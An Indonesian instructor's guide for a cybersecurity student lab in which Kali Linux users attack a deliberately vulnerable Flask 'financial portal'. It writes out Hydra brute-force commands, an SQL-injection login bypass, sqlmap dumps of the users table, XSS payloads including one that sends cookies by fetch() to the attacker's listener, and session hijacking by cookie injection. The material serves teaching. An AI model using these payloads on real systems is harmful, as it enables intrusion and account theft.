# 🛡️ PANDUAN LENGKAP LAB PENETRATION TESTING
## Portal Finansial PT Teknologi Aman Sejahtera
> **Lingkungan:** Lab Ujian & Praktikum Cybersecurity Mahasiswa  
> **Server:** Python Flask + SQLite + Waitress WSGI (Multi-threaded Production Server)

---

## 1. Persiapan & Menjalankan Live Server di Laptop

Aplikasi ini sudah dipasangi server WSGI **Waitress (16 threads)**, sehingga tidak akan *hang* atau *freeze* ketika di-scan secara bersamaan oleh banyak mahasiswa menggunakan `sqlmap`, `ffuf`, atau `gobuster`.

### Cara Menjalankan Server:
Buka PowerShell / Command Prompt di folder proyek:
```powershell
cd "c:\website ethical hacker"
python app.py
```
Server akan aktif di port `5000` dan mendengarkan ke semua adapter jaringan (`0.0.0.0:5000`).

---

## 2. Menghubungkan Kali Linux Mahasiswa ke Laptop Dosen

Agar mahasiswa dapat mengakses web dari Kali Linux:

1. **Cek Alamat IP Laptop Anda:**
   Buka terminal di laptop host, ketik:
   ```powershell
   ipconfig
   ```
   Cari **IPv4 Address** pada adapter WiFi atau Ethernet (contoh: `192.168.1.50` atau `192.168.18.54`).

2. **Pengaturan Jaringan (Pilih salah satu):**
   - **Skema 1: Satu Jaringan WiFi / Router Lab**  
     Laptop Anda dan laptop mahasiswa terhubung ke WiFi yang sama. Mahasiswa cukup membuka browser di Kali:  
     `http://<IP_LAPTOP_ANDA>:5000`
   - **Skema 2: Hotspot dari Laptop Anda**  
     Nyalakan *Mobile Hotspot* di Windows Anda. Mahasiswa menghubungkan WiFi ke hotspot Anda.
   - **Skema 3: Kali Linux di Virtual Machine (VMware / VirtualBox)**  
     Ubah network adapter VM Kali Linux menjadi **Bridged Adapter** (atau *Host-Only*).

3. **Pastikan Windows Firewall Mengizinkan Port 5000:**
   Jika mahasiswa gagal terhubung (*Connection Timed Out*), buka port 5000 di firewall dengan menjalankan perintah ini sekali di PowerShell (Run as Administrator):
   ```powershell
   netsh advfirewall firewall add rule name="CyberLab 5000" dir=in action=allow protocol=TCP localport=5000
   ```

---

## 3. Modul & Panduan Latihan Tools Kali Linux

### 🎯 MODUL 1: Credential Brute-Forcing (THC Hydra & Burp Suite Intruder)
Mahasiswa belajar membongkar password akun divisi keuangan menggunakan kamus kata sandi.

- **Target URL:** `http://<IP>:5000/api/login`
- **Method:** `POST` (Parameter: `username` & `password`)
- **Indikator Gagal:** HTTP 401 dan kata `"salah"`
- **Akun yang Tersedia di Database:**
  - `budi.finance` (Password: `password123` - terdapat di kamus `rockyou.txt`)
  - `siti.akuntansi` (Password: `qwerty`)
  - `andi.audit` (Password: `12345678`)
  - `admin` (Password: `Admin@TAS2024`)

**Perintah Hydra di Kali Linux:**
```bash
hydra -l budi.finance -P /usr/share/wordlists/rockyou.txt <IP_TARGET> -s 5000 http-post-form "/api/login:username=^USER^&password=^PASS^:F=salah"
```

---

### 🎯 MODUL 2: SQL Injection (SQLMap & Manual Authentication Bypass)

#### Skenario A: Login Bypass (Manual SQLi)
Mahasiswa dapat masuk ke sistem tanpa mengetahui password:
- Di form login `/login`, masukkan:
  - **Username:** `' OR 1=1 --`
  - **Password:** *(kosongkan atau isi sembarang)*
- **Hasil:** Berhasil login langsung sebagai pengguna pertama (Admin).

#### Skenario B: Database Dump dengan SQLMap
Fitur pencarian transaksi pada laporan keuangan rentan terhadap SQL Injection concatenation.
- **Target URL:** `http://<IP>:5000/dashboard/laporan?q=test`
- **Prasyarat:** Butuh cookie sesi (`session_token=xYz890AbC`)

**Perintah SQLMap di Kali Linux:**
```bash
# 1. Mendeteksi Database Management System (DBMS)
sqlmap -u "http://<IP_TARGET>:5000/dashboard/laporan?q=vendor" --cookie="session_token=xYz890AbC" --dbs --batch

# 2. Mendapatkan daftar tabel
sqlmap -u "http://<IP_TARGET>:5000/dashboard/laporan?q=vendor" --cookie="session_token=xYz890AbC" --tables --batch

# 3. Men-dump tabel users (Username & Password)
sqlmap -u "http://<IP_TARGET>:5000/dashboard/laporan?q=vendor" --cookie="session_token=xYz890AbC" -T users --dump --batch
```

---

### 🎯 MODUL 3: Stored & Reflected XSS (Cross-Site Scripting)

#### Skenario A: Reflected XSS
- Buka di browser Kali:
  ```text
  http://<IP_TARGET>:5000/dashboard/laporan?q=<script>alert('Reflected XSS')</script>
  ```
- Script langsung tereksekusi saat halaman dimuat.

#### Skenario B: Stored XSS & Pencurian Cookie (Session Hijacking)
Mahasiswa memanfaatkan fitur **Papan Memo & Catatan Internal** di `/dashboard/keuangan`:
1. Di Kali Linux, mahasiswa membuka terminal dan menyalakan listener:
   ```bash
   nc -lvnp 8080
   ```
2. Di portal web korban, mahasiswa mengirim memo dengan payload:
   ```html
   <script>fetch('http://<IP_KALI>:8080/?st='+document.cookie)</script>
   ```
3. Setiap kali karyawan/pengguna lain membuka dashboard, payload JavaScript otomatis berjalan di latar belakang.
4. Karena cookie `session_token` disetel **tanpa flag `HttpOnly`**, cookie berhasil dikirim ke terminal Netcat Kali Linux.

---

### 🎯 MODUL 4: Session Hijacking (Cookie Manipulation)
Mahasiswa membuktikan bahwa kepemilikan cookie valid setara dengan kepemilikan akun:
1. Buka browser baru (Incognito / tab bersih) di Kali Linux.
2. Akses `http://<IP_TARGET>:5000/dashboard/keuangan` -> Akan dialihkan (redirect) ke `/login`.
3. Buka Developer Tools (F12) -> Console, suntikkan cookie hasil curian:
   ```javascript
   document.cookie = "session_token=xYz890AbC; path=/";
   ```
4. Refresh halaman -> Berhasil masuk dashboard keuangan tanpa memasukkan username/password.

---

### 🎯 MODUL 5: Directory & Content Discovery (FFUF / Gobuster)
Mahasiswa mencari endpoint internal dan file tersembunyi:

**Perintah FFUF di Kali Linux:**
```bash
ffuf -u http://<IP_TARGET>:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302
```
**Endpoint yang berhasil ditemukan mahasiswa:**
- `/login`
- `/it-update` (Halaman Phishing terselubung)
- `/awareness-education`
- `/dashboard/keuangan`
- `/dashboard/laporan`
- `/dashboard/transfer_dana`
- `/web_access.log`

---

### 🎯 MODUL 6: Social Engineering & Phishing Analysis
- Buka halaman: `http://<IP_TARGET>:5000/it-update`
- Mahasiswa ditugaskan menganalisis 3 kejanggalan (*Red Flags*):
  1. URL logo dari domain antah berantah (`totally-not-phishing-assets.ru`).
  2. Kata-kata intimidasi dan timer hitung mundur mendesak.
  3. Kesalahan penulisan nama di footer (*"PT Teknolgi Aman"*).
- Saat form disubmit, mahasiswa diarahkan ke `/awareness-education`. Password sama sekali tidak disimpan untuk menjaga etika dan keamanan lab.

---

## 4. Log Akses & Monitoring (`web_access.log`)
Sebagai dosen/instruktur, Anda dapat memantau seluruh aktivitas scanning dan serangan mahasiswa secara *real-time*:
```powershell
Get-Content web_access.log -Wait -Tail 20
```
Format log mencatat IP mahasiswa, URL yang diakses, status HTTP, serta cookie token yang dikirimkan.

